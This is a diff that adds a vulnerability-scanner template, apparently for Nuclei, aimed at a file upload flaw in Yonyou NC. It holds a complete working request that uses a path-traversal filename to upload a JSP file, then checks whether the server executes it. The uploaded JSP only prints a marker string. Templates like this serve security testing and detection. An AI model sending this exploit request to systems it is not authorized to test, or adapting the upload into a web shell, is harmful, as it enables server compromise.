@@ -1,0 +1,48 @@
+id: yonyou_nc-file_upload-CT-456684
+
+info:
+  name: Yonyou NC File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    This template detects a file upload vulnerability in Yonyou NC systems.
+  reference:
+    - https://github.com/onMey/SRC/blob/main/u8_upload.py
+
+variables:
+  r1: '{{md5(rand_text_alpha(16))}}'
+  randomFilename: '{{rand_text_alpha(6)}}'
+  randomBoundary: '{{rand_text_alpha(8)}}'
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "/UploadFileData?action=upload_file&filename=../.{{randomFilename}}.jsp"
+    headers:
+      Content-Type: 'multipart/form-data; boundary=----WebKitFormBoundary{{randomBoundary}}'
+    body: |
+      ------WebKitFormBoundary{{randomBoundary}}\r\nContent-Disposition: form-data; name="upload"; filename="{{randomFilename}}.jsp"\r\nContent-Type: application/octet-stream\r\n\r\n<% {out.print("{{r1}}");} %>\r\n------WebKitFormBoundary{{randomBoundary}}\r\nContent-Disposition: form-data; name="submit"\r\n\r\nsubmit\r\n------WebKitFormBoundary{{randomBoundary}}--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "showSucceedMsg"
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "/R9iPortal/.{{randomFilename}}.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{r1}}"
